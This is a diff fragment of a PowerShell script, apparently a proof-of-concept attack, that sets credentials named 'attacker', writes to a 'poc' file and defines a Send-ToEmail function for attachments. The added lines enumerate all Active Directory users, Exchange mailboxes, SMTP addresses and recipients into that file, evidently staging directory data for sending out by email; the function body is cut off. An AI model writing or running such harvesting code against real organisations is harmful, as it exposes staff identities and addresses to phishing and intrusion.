@@ -28,7 +28,6 @@ function Log-Message-alert
 
 
 
-
 $username = "attacker";
 $password = "password";
 $path = "C:\poc-$(get-date -f MM-dd).txt";
@@ -37,6 +36,14 @@ Get-CimInstance -Class CIM_ComputerSystem -ComputerName localhost -ErrorAction S
 
 
 $wholog = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name).Split('\')[1];
+
+
+Get-ADUser -Filter * -Properties * | Select Name, DisplayName, SamAccountName, UserPrincipalName | Out-File -FilePath $path;
+Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName,PrimarySmtpAddress | Sort-Object DisplayName | Out-File -FilePath $path;
+Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName,PrimarySmtpAddress, @{Name="EmailAddresses";Expression={($_.EmailAddresses | Where-Object {$_ -clike "smtp*"} | ForEach-Object {$_ -replace "smtp:",""}) -join ","}} | Sort-Object DisplayName | Out-File -FilePath $path;
+Get-Recipient | Select DisplayName, RecipientType, EmailAddresses | Out-File -FilePath $path;
+Get-ADUser -Filter * -Properties EmailAddress,DisplayName, samaccountname| select EmailAddress, DisplayName | Out-File -FilePath $path;
+
 
 function Send-ToEmail([string]$email, [string]$attachmentpath){
 
